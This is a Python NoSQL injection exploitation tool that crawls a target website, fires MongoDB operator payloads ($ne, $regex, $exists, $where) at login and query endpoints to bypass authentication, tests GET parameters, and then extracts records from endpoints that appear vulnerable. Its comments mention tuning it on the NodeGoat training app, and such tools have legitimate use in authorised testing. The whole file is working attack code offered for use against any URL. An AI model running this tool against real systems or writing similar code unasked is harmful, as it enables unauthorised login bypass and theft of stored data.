#!/usr/bin/env python3
"""
NoSQL Injection Exploitation Framework v2.2 (Fixed)
=========================================================
Fixes:
- Fixed 'name 'urlencode' is not defined' error.
- Ensures GET parameter testing functions correctly.
- Generates clean JSON reports.

v2.3 changes (this patch):
- Added --target / --params: when provided, skips the internal
  Hellhound-Spider discovery crawl entirely and tests exactly the given
  endpoint(s) instead of re-crawling the whole site blind. Mirrors
  sqli.py's existing --target single-endpoint mode. Without --target,
  behavior is unchanged (full crawl-then-test, same as before).
- Fixed analyze_response()'s sensitive-data indicator to compare against
  the baseline response instead of firing on any response containing
  common security-related words. Confirmed root cause of false positives
  on NodeGoat's own /tutorial/* educational pages (2026-08-24): those
  pages' prose legitimately discusses "password"/"session"/"token" as
  their subject matter, which tripped this check on every single request
  regardless of whether an injection payload had any real effect.
"""

import argparse
import json
import re
import sys
import uuid
import time
import threading
import urllib.parse
import warnings
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, unquote, urlencode  # FIXED: Added urlencode

warnings.filterwarnings('ignore')

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4", "-q"])
    import requests
    from bs4 import BeautifulSoup

# Constants for Output Colors
C_RESET = "\x1b[0m"
C_RED = "\x1b[31m"
C_GREEN = "\x1b[32m"
C_YELLOW = "\x1b[33m"
C_CYAN = "\x1b[36m"

class NoSQLInjector:
    def __init__(self, base_url, proxy=None, dataset_path='dataset_nosql.txt', depth=3, concurrency=10,
                 verbose=False, target_endpoints=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        # Configuration
        self.proxy = proxy
        self.dataset_path = dataset_path
        self.depth = depth
        self.concurrency = concurrency
        self.verbose = verbose
        self.start_time = time.time()

        # When set, run() skips discover_endpoints() entirely and tests
        # exactly these endpoints (a dict of {path: [param_names]})
        # instead of crawling the whole site. None (default) preserves
        # the original full-crawl behavior unchanged.
        self.target_endpoints = target_endpoints
        
        # Data Storage
        self.findings = []
        self.errors = []
        self.discovered_endpoints = set()
        self.discovered_params = {} 
        self.visited_urls = set()
        self.pending_urls = []
        self.security_tags = {}
        self.timeline = []
        
        # Locks for thread safety
        self.lock = threading.Lock()
        
        # Setup Session
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, */*',
            'Content-Type': 'application/json'
        }

        # Load Payloads
        self.payloads = self._load_dataset()
        
        self.add_timeline("Framework initialized")
        self.add_timeline(f"Target: {self.base_url}")

    def get_timestamp(self):
        elapsed = time.time() - self.start_time
        mins = int(elapsed // 60)
        secs = int(elapsed % 60)
        ms = int((elapsed * 1000) % 1000)
        return f"{mins:02d}:{secs:02d}.{ms:03d}"

    def add_timeline(self, event, details=None):
        entry = {
            "time": self.get_timestamp(),
            "event": event
        }
        if details:
            entry['info'] = details
            
        with self.lock:
            self.timeline.append(entry)
        
        color = C_RESET
        if 'VULNERABLE' in event: color = C_RED
        elif 'discovered' in event or 'loaded' in event or 'Extracted' in event: color = C_GREEN
        else: color = C_CYAN
            
        print(f"{color}[{entry['time']}]{C_RESET} {event}")
        if details and self.verbose:
            print(f"         └─ {details}")

    def log(self, msg, level='info'):
        prefix = {
            'info': '[*]', 'warn': '[!]', 'found': '[+]', 'error': '[E]'
        }.get(level, '[*]')
        print(f"{prefix} {msg}")

    def _load_dataset(self):
        print(f"[*] Loading payloads from: {self.dataset_path}")
        try:
            with open(self.dataset_path, 'r') as f:
                data = json.load(f)
        except Exception as e:
            print(f"[!] Dataset not found or invalid: {e}")
            return self._get_fallback_payloads()

        payloads = {
            'authBypass': [],
            'regexBypass': [],
            'existsBypass': [],
            'blankQuery': [],
            'genericInjection': [],
            'inNin': [],
            'orAnd': [],
            'whereJs': []
        }

        if 'mongodb_operator_ne' in data and 'json_payloads' in data['mongodb_operator_ne']:
            payloads['authBypass'] = data['mongodb_operator_ne']['json_payloads'][:20]
        if 'mongodb_operator_regex' in data and 'json_payloads' in data['mongodb_operator_regex']:
            payloads['regexBypass'] = data['mongodb_operator_regex']['json_payloads'][:15]
        if 'mongodb_operator_exists' in data and 'json_payloads' in data['mongodb_operator_exists']:
            payloads['existsBypass'] = data['mongodb_operator_exists']['json_payloads'][:10]
        if 'mongodb_operator_in_nin' in data and 'json_payloads' in data['mongodb_operator_in_nin']:
            payloads['inNin'] = data['mongodb_operator_in_nin']['json_payloads'][:10]
        if 'mongodb_operator_or_and_nor' in data and 'json_payloads' in data['mongodb_operator_or_and_nor']:
            payloads['orAnd'] = data['mongodb_operator_or_and_nor']['json_payloads'][:10]
        if 'mongodb_where_tautology' in data and 'json_payloads' in data['mongodb_where_tautology']:
            payloads['whereJs'] = data['mongodb_where_tautology']['json_payloads'][:10]

        payloads['blankQuery'] = [{}, {'query': {}}, {'filter': {}}, {'search': {}}, {'data': {}}]
        payloads['genericInjection'] = [{"$ne": ""}, {"$gt": ""}, {"$exists": True}, {"$regex": ".*"}]

        total = sum(len(v) for v in payloads.values())
        print(f"[+] Loaded {total} payloads from dataset")
        return payloads

    def _get_fallback_payloads(self):
        return {
            "authBypass": [{"username": {"$ne": ""}, "password": {"$ne": ""}}],
            "regexBypass": [{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}],
            "existsBypass": [{"username": {"$exists": True}, "password": {"$exists": True}}],
            "blankQuery": [{}],
            "genericInjection": [{"$ne": ""}],
            "inNin": [], "orAnd": [], "whereJs": []
        }

    def http_request(self, path, method='GET', body=None):
        url = urljoin(self.base_url, path)
        try:
            if method == 'GET':
                resp = self.session.get(url, headers=self.headers, timeout=10)
            else:
                resp = self.session.post(url, json=body, headers=self.headers, timeout=10)
            return resp
        except Exception as e:
            return None

    def extract_links(self, html):
        links = set()
        patterns = [
            r'href=["\']([^"\']+)["\']',
            r'action=["\']([^"\']+)["\']',
            r'router\s*\(\s*["\']([^"\']+)["\']',
            r'push\s*\(\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']'
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                url = match.group(1)
                if url.startswith('/') and not url.startswith('//'):
                    links.add(url.split('?')[0].split('#')[0])
        return links

    def extract_security_tags(self, url, content):
        tags = []
        content_lower = content.lower()
        if re.search(r'login|auth|signin|password|reset', url, re.I): tags.append('auth_classification')
        if re.search(r'admin|dashboard|manage|settings', url, re.I): tags.append('admin_panel')
        if re.search(r'id|uuid|user_id|session_id|token', url, re.I): tags.append('idor_candidate')
        if re.search(r'search|query|filter|sort|order|page', url, re.I):
            tags.append('sqli_candidate')
            tags.append('nosql_candidate')
        if re.search(r'\.env|\.bak|\.log|\.sql|\.yaml|\.yml|\.json|\.config|\.conf', content, re.I): tags.append('Leaked-File')
        if re.search(r'api[_-]?key|secret|token|password|private', content, re.I): tags.append('SECRET:potential_credential')
        return tags

    def extract_params(self, content):
        params = set()
        for m in re.finditer(r'name=["\']([^"\']+)["\']', content): params.add(m.group(1))
        for m in re.finditer(r'[?&]([a-zA-Z0-9_]+)=', content): params.add(m.group(1)[1:]) 
        for m in re.finditer(r'"([a-zA-Z0-9_]+)"\s*:', content): params.add(m.group(1))
        return list(params)

    def spider_crawl(self, url_obj, depth):
        if depth > self.depth: return
        url_key = f"{url_obj.path}{url_obj.query}"
        if url_key in self.visited_urls: return
        
        with self.lock: self.visited_urls.add(url_key)
        if self.verbose: self.log(f"Crawling [depth:{depth}]: {url_key}", 'info')

        try:
            resp = self.http_request(url_key)
            if not resp or resp.status_code >= 500: return

            with self.lock:
                self.discovered_endpoints.add(url_obj.path)
                if url_obj.path not in self.discovered_params: self.discovered_params[url_obj.path] = []
                self.discovered_params[url_obj.path].extend(self.extract_params(resp.text))

            tags = self.extract_security_tags(url_key, resp.text)
            if tags:
                with self.lock: self.security_tags[url_obj.path] = tags

            links = self.extract_links(resp.text)
            for link in links:
                full_link = urljoin(self.base_url, link)
                parsed_link = urlparse(full_link)
                if parsed_link.netloc == urlparse(self.base_url).netloc:
                    with self.lock: self.pending_urls.append({'url': full_link, 'depth': depth + 1})

            js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', resp.text)
            for js_match in js_files[:5]:
                js_url = urljoin(self.base_url, js_match)
                js_resp = self.http_request(urlparse(js_url).path)
                if js_resp:
                    api_matches = re.findall(r'["\']([^"\']{2,})["\']', js_resp.text)
                    for path in api_matches:
                        if path.startswith('/') and not any(ext in path for ext in ['.js', '.css', '.png', '.jpg']):
                            full_path = urljoin(self.base_url, path)
                            parsed_path = urlparse(full_path)
                            if parsed_path.netloc == urlparse(self.base_url).netloc:
                                with self.lock:
                                    self.pending_urls.append({'url': full_path, 'depth': depth + 1})
                                    self.discovered_params[url_obj.path].extend(self.extract_params(js_resp.text))
        except Exception as e:
            self.errors.append(f"Crawl error for {url_key}: {str(e)}")

    def discover_endpoints(self):
        print(f'\n[*] Phase 1: Hellhound-Spider Discovery...')
        print(f'[*] Configuration: depth={self.depth}, concurrency={self.concurrency}')
        self.pending_urls.append({'url': self.base_url + '/', 'depth': 0})

        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(self._check_robots), executor.submit(self._check_sitemap), executor.submit(self._check_security_txt)]
            for f in as_completed(futures): pass

        while self.pending_urls:
            batch = self.pending_urls[:self.concurrency]
            self.pending_urls = self.pending_urls[self.concurrency:]
            
            with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
                futures = []
                for item in batch:
                    parsed = urlparse(item['url'])
                    futures.append(executor.submit(self.spider_crawl, parsed, item['depth']))
                for f in as_completed(futures): pass

        print(f"\n[+] Hellhound-Spider discovered {len(self.discovered_endpoints)} unique endpoints")
        print(f"[+] Found {sum(len(v) for v in self.discovered_params.values())} total parameters")

    def load_target_endpoints(self):
        """
        Skip discovery entirely and populate discovered_endpoints/params
        directly from a caller-supplied target list, instead of crawling
        the whole site. Used when --target is passed on the CLI.
        """
        print(f'\n[*] Phase 1: Skipped (--target given) — testing {len(self.target_endpoints)} caller-specified endpoint(s) directly')
        for path, params in self.target_endpoints.items():
            self.discovered_endpoints.add(path)
            self.discovered_params[path] = list(params)
        total_params = sum(len(v) for v in self.discovered_params.values())
        print(f"[+] Using {len(self.discovered_endpoints)} endpoint(s), {total_params} parameter(s) — no crawl performed")

    def _check_robots(self):
        try:
            r = self.http_request('/robots.txt')
            if r and r.text:
                for m in re.findall(r'Allow:\s*(\/[^\s#]+)', r.text):
                    self.pending_urls.append({'url': urljoin(self.base_url, m), 'depth': 1})
        except: pass
    def _check_sitemap(self):
        try:
            r = self.http_request('/sitemap.xml')
            if r and r.text:
                for m in re.findall(r'<loc>([^<]+)<\/loc>', r.text):
                    if urlparse(self.base_url).netloc in m:
                        self.pending_urls.append({'url': m, 'depth': 1})
        except: pass
    def _check_security_txt(self):
        try:
            if self.http_request('/.well-known/security.txt'): self.log('Found security.txt', 'found')
        except: pass

    def map_inputs(self, endpoint):
        if endpoint not in self.discovered_params: self.discovered_params[endpoint] = []
        return {'query': self.discovered_params[endpoint], 'form': []}

    def analyze_response(self, response, baseline=None):
        if not response: return {'vulnerable': False, 'score': 0, 'indicators': []}
        score = 0
        indicators = []
        content = response.text
        try: data = response.json()
        except: data = {'raw': content}

        if 'success' in content and 'true' in content: indicators.append('auth_success'); score += 3

        # FIXED: previously fired on ANY response containing these words,
        # including pages whose legitimate prose content discusses them
        # (e.g. NodeGoat's own /tutorial/* pages, which teach about
        # passwords/sessions/tokens as their subject matter -- confirmed
        # false-positive source, 2026-08-24). Now only counts this
        # indicator when the words appear in the payload response but
        # were NOT already present in the baseline -- i.e. the injection
        # actually changed something, rather than the page simply being
        # about that topic. Falls back to the old unconditional check
        # only when no baseline was captured (matches test_query_injection,
        # which doesn't pass one) to avoid silently losing the signal.
        sensitive_pat = re.compile(r'token|session|jwt|cookie|flag|api_key|password', re.I)
        if baseline is not None:
            if sensitive_pat.search(content) and not sensitive_pat.search(baseline.text):
                indicators.append('sensitive_data'); score += 4
        else:
            if sensitive_pat.search(content): indicators.append('sensitive_data'); score += 4

        if 'admin' in content and 'password' in content: indicators.append('credential_leak'); score += 5
        if content.count('{') > 5: indicators.append('bulk_data'); score += 2
        if baseline and len(content) > len(baseline.text) * 2: indicators.append('size_anomaly'); score += 2
        if '"auth"' in content and 'valid' in content: indicators.append('status_success'); score += 3
        return {'vulnerable': score >= 3, 'score': score, 'indicators': indicators}

    def test_endpoint(self, endpoint, method='POST', payload=None, params=None):
        try:
            path = endpoint
            if params:
                qs = urlencode(params) # FIXED: urlencode is now imported
                path = f"{endpoint}?{qs}"
            if method == 'GET': return self.http_request(path, 'GET')
            else: return self.http_request(path, 'POST', payload)
        except Exception as e:
            self.errors.append(f"Request error for {endpoint}: {e}")
            return None

    def _create_finding(self, endpoint, method, vuln_type, severity, parameter, payload, response, analysis):
        raw_req_body = json.dumps(payload) if payload else ""
        raw_request = f"{method} {endpoint}\nContent-Type: application/json\nBody: {raw_req_body}"
        raw_resp_body = ""
        if response:
            try: raw_resp_body = json.dumps(response.json(), indent=2)
            except: raw_resp_body = response.text[:1000]
        raw_response = f"Status: {response.status_code if response else 'N/A'}\nBody: {raw_resp_body}"

        return {
            "id": str(uuid.uuid4()), "agent_group": "nosql-injection-framework", "sub_agent": "dynamic-exploit",
            "vulnerability_type": vuln_type, "severity": severity, "target_url": urljoin(self.base_url, endpoint),
            "description": f"{vuln_type} via {parameter}",
            "observation": f"Score: {analysis['score']} | Indicators: {', '.join(analysis['indicators'])}",
            "timestamp": datetime.now().isoformat(), "affected_parameter": parameter,
            "confidence": "high" if analysis['score'] >= 4 else "medium",
            "proof_of_concept": json.dumps(payload),
            "reproduction_steps": [f"Send {method} request to {endpoint}", f"Use payload: {json.dumps(payload)}", f"Observe indicators: {', '.join(analysis['indicators'])}"],
            "cve_reference": "N/A", "remediation": "Sanitize inputs, use parameterized queries, implement WAF rules",
            "raw_request": raw_request, "raw_response": raw_response
        }

    def test_auth_bypass(self, endpoint):
        self.add_timeline(f"Testing auth bypass on {endpoint}")
        baseline = self.test_endpoint(endpoint, 'POST', {"username": "test", "password": "test"})
        baseline_analysis = self.analyze_response(baseline)
        
        all_auth_payloads = self.payloads['authBypass'] + self.payloads['regexBypass'] + self.payloads['existsBypass'] + self.payloads['inNin'] + self.payloads['orAnd'] + self.payloads['whereJs']
        
        tested = 0
        for payload in all_auth_payloads[:30]:
            tested += 1
            response = self.test_endpoint(endpoint, 'POST', payload)
            analysis = self.analyze_response(response, baseline)
            
            if analysis['vulnerable'] or analysis['score'] > baseline_analysis['score']:
                print(f"{C_RED}[!] VULNERABLE: {endpoint} - Score: {analysis['score']}{C_RESET}")
                print(f"    Payload: {json.dumps(payload)}")
                finding = self._create_finding(endpoint, 'POST', 'NoSQL Injection - Auth Bypass', 'critical', 'body (JSON)', payload, response, analysis)
                with self.lock: self.findings.append(finding)
                return True
        print(f"    Tested {tested} auth bypass payloads")
        return False

    def test_query_injection(self, endpoint):
        self.add_timeline(f"Testing query injection on {endpoint}")
        all_query_payloads = self.payloads['blankQuery'] + self.payloads['genericInjection'] + self.payloads['authBypass'] + self.payloads['regexBypass'] + self.payloads['whereJs']
        
        tested = 0
        for payload in all_query_payloads[:30]:
            tested += 1
            response = self.test_endpoint(endpoint, 'POST', payload)
            analysis = self.analyze_response(response)
            
            if analysis['score'] >= 2:
                print(f"{C_RED}[!] VULNERABLE: {endpoint} - Score: {analysis['score']}{C_RESET}")
                finding = self._create_finding(endpoint, 'POST', 'NoSQL Injection - Query Injection', 'critical', 'body (JSON)', payload, response, analysis)
                with self.lock: self.findings.append(finding)
                return True
        return False

    def test_get_params(self, endpoint, params):
        self.add_timeline(f"Testing GET parameters on {endpoint}")
        for param in params[:20]:
            baseline = self.test_endpoint(endpoint, 'GET', None, {param: 'test'})
            injections = ['{$ne: ""}', '{"$ne": ""}', '{"$exists": true}', '{}']
            for injection in injections:
                encoded = injection.replace('{', '%7B').replace('}', '%7D').replace('$', '%24')
                response = self.test_endpoint(endpoint, 'GET', None, {param: encoded})
                analysis = self.analyze_response(response, baseline)
                
                if analysis['score'] >= 2:
                    print(f"{C_RED}[!] VULNERABLE: {endpoint}?{param} - Score: {analysis['score']}{C_RESET}")
                    finding = self._create_finding(f"{endpoint}?{param}={encoded}", 'GET', 'NoSQL Injection - GET Parameter', 'high', param, injection, response, analysis)
                    with self.lock: self.findings.append(finding)
                    return True
        return False

    def extract_data(self, endpoint):
        self.add_timeline(f"Starting data extraction from {endpoint}")
        for payload in self.payloads['blankQuery'][:3]:
            response = self.test_endpoint(endpoint, 'POST', payload)
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, dict):
                        count = len(data.get('results', data.get('data', data.get('flags', []))))
                        if count > 0:
                            self.add_timeline(f"Extracted data from {endpoint}", f"{count} records")
                            return data
                except: pass
        return None

    def _process_endpoint_tests(self, endpoint):
        params = self.map_inputs(endpoint)
        self.test_auth_bypass(endpoint)
        self.test_query_injection(endpoint)
        self.test_get_params(endpoint, params.get('query', []))

    def run(self):
        print(f'\n{C_CYAN}╔{"═"*58}╗{C_RESET}')
        print(f'{C_CYAN}║{C_RESET}  NoSQL Injection Exploitation Framework v2.2'.ljust(58) + f'{C_CYAN}║{C_RESET}')
        print(f'{C_CYAN}║{C_RESET}  Fixed Version (Import Error Resolved)'.ljust(58) + f'{C_CYAN}║{C_RESET}')
        print(f'{C_CYAN}╚{"═"*58}╝{C_RESET}')
        print(f"\n{C_YELLOW}[*]{C_RESET} Target: {C_GREEN}{self.base_url}{C_RESET}")
        print(f"{C_YELLOW}[*]{C_RESET} Starting exploitation...\n")
        
        if self.target_endpoints:
            self.load_target_endpoints()
        else:
            self.discover_endpoints()
        print(f'\n{C_CYAN}{"═"*60}{C_RESET}'); print('  Phase 3-6: Testing & Exploitation'); print(f'{C_CYAN}{"═"*60}{C_RESET}')
        
        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = [executor.submit(self._process_endpoint_tests, ep) for ep in sorted(list(self.discovered_endpoints))]
            for f in as_completed(futures): pass

        print(f'\n{C_CYAN}{"═"*60}{C_RESET}'); print('  Phase 7-8: Data Extraction'); print(f'{C_CYAN}{"═"*60}{C_RESET}')
        for endpoint in set([urlparse(f['target_url']).path for f in self.findings]):
            self.extract_data(endpoint)
            
        return self.generate_report()

    def generate_report(self):
        total_time = time.time() - self.start_time
        print(f'\n{C_RED}╔{"═"*58}╗{C_RESET}'); print(f'{C_RED}║{C_RESET}  TIMELINE REPORT'.ljust(58) + f'{C_RED}║{C_RESET}'); print(f'{C_RED}╚{"═"*58}╝{C_RESET}')
        print(f"\n{C_YELLOW}Total Duration:{C_RESET} {total_time:.2f}s")
        print(f"{C_YELLOW}Endpoints Discovered:{C_RESET} {len(self.discovered_endpoints)}")
        print(f"{C_YELLOW}Vulnerabilities Found:{C_RESET} {len(self.findings)}")
        print(f'\n{C_CYAN}┌{"─"*58}┐{C_RESET}'); print(f'{C_CYAN}│{C_RESET} CHRONOLOGICAL TIMELINE '.center(58) + f'{C_CYAN}│{C_RESET}'); print(f'{C_CYAN}└{"─"*58}┘{C_RESET}')
        
        critical_count = len([f for f in self.findings if f['severity'] == 'critical'])
        high_count = len([f for f in self.findings if f['severity'] == 'high'])
        
        for entry in self.timeline:
            is_vuln = 'VULNERABLE' in entry['event']
            is_found = 'discovered' in entry['event'] or 'loaded' in entry['event']
            color = C_RED if is_vuln else (C_GREEN if is_found else C_CYAN)
            icon = '[!]' if is_vuln else ('[+]' if is_found else '[*]')
            print(f"{C_CYAN}{entry['time']}{C_RESET} {color}{icon}{C_RESET} {entry['event']}")
            if 'info' in entry: print(f"           {C_CYAN}└─ {entry['info']}{C_RESET}")

        print(f'\n{C_RED}╔{"═"*58}╗{C_RESET}'); print(f'{C_RED}║{C_RESET}  SUMMARY'.ljust(58) + f'{C_RED}║{C_RESET}'); print(f'{C_RED}╚{"═"*58}╝{C_RESET}')
        print(f"\n{C_RED}[!] Critical:{C_RESET} {critical_count} | {C_YELLOW}[!] High:{C_RESET} {high_count}")
        if self.findings:
            print(f'\n{C_YELLOW}Vulnerable Endpoints:{C_RESET}')
            for i, ep in enumerate(list(set([urlparse(f['target_url']).path for f in self.findings]))):
                print(f"  {i+1}. {C_RED}{ep}{C_RESET}")

        return {
            "status": "completed", "timeline": self.timeline,
            "summary": {"target": self.base_url, "duration_seconds": f"{total_time:.2f}", "endpoints_discovered": len(self.discovered_endpoints), "vulnerabilities_found": len(self.findings), "critical": critical_count, "high": high_count},
            "findings": self.findings, "errors": self.errors, "gap_reason": None
        }

def _parse_target_endpoints(target_arg, params_arg):
    """
    Builds the {path: [params]} dict load_target_endpoints() needs from
    --target (one or more comma-separated paths) and --params (comma-
    separated param names, applied to every given target path -- this
    tool tests one path at a time in practice, so a single shared param
    list is sufficient rather than needing a more complex per-path
    mapping syntax).
    """
    paths = [p.strip() for p in target_arg.split(',') if p.strip()]
    params = [p.strip() for p in params_arg.split(',')] if params_arg else []
    return {urlparse(p).path or '/': params for p in paths}

def main():
    parser = argparse.ArgumentParser(description='NoSQL Injection Exploitation Framework v2.2')
    parser.add_argument('--url', '-u', required=True, help='Target base URL')
    parser.add_argument('--proxy', '-p', help='Proxy URL')
    parser.add_argument('--dataset', '-d', default='dataset_nosql.json', help='Path to dataset file')
    parser.add_argument('--depth', '-D', type=int, default=3, help='Crawl depth')
    parser.add_argument('--concurrency', '-c', type=int, default=10, help='Concurrent requests')
    parser.add_argument('--verbose', '-v', action='store_true', help='Show all discovery logs')
    parser.add_argument('--output', '-o', help='Output file for report (JSON)')
    parser.add_argument('--target', '-t',
                        help='Comma-separated path(s) to test directly, skipping the internal '
                             'discovery crawl entirely (e.g. "/login,/signup"). Use with --params.')
    parser.add_argument('--params',
                        help='Comma-separated param names to test on each --target path '
                             '(e.g. "userName,password"). Ignored without --target.')
    
    args = parser.parse_args()
    target_endpoints = _parse_target_endpoints(args.target, args.params) if args.target else None
    injector = NoSQLInjector(args.url, args.proxy, args.dataset, args.depth, args.concurrency, args.verbose,
                             target_endpoints=target_endpoints)
    report = injector.run()
    
    if args.output:
        with open(args.output, 'w') as f: json.dump(report, f, indent=2)
        print(f"\n{C_GREEN}[+]{C_RESET} Report saved to {C_CYAN}{args.output}{C_RESET}")

if __name__ == '__main__':
    main()